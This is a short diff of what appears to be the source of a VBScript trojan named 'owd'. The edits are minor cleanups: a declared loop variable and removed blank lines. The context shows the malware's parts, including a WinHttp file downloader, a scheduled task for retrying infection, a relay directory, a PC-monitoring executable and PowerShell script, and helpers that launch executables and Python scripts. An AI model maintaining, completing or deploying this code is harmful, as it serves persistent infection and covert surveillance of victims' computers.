@@ -287,6 +287,7 @@ Function DownloadFileWithHeaders(sURL, sFile, headersin, headers)
     Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
     objHTTP.Open "GET", sURL, False
 
+    Dim kkey
     If IsDict(headersin) Then
         For Each kkey In headersin
             objHTTP.SetRequestHeader kkey, headersin(kkey)
@@ -1097,7 +1098,6 @@ If XIsEmpty(cmdname) Then
     cmdname = "init"
 End IF
 
-
 Dim trojanname : trojanname = "owd"
 
 Dim tskname : tskname=UCase(trojanname) & "_retry_infection_vbs"
@@ -1122,7 +1122,6 @@ Dim relaydir : relaydir = workdir & "\" & "relay"
 Dim pcmonfname : pcmonfname = "pcmon.exe"
 Dim pspcmonfname : pspcmonfname = "pc_monitoring.ps1"
 Dim pcmondir : pcmondir = workdir & "\" & "pcmon"
-
 
 Dim istplmode : istplmode = False
 
@@ -2742,7 +2741,6 @@ Function ExecExe(exename, exefname, exedir, args)
     Call LogMsg("ExecExe finished")
 
 End Function 
-
 
 Function ExecPython(scriptname, scriptdir, scriptfname, args)
     ExecPython = -1
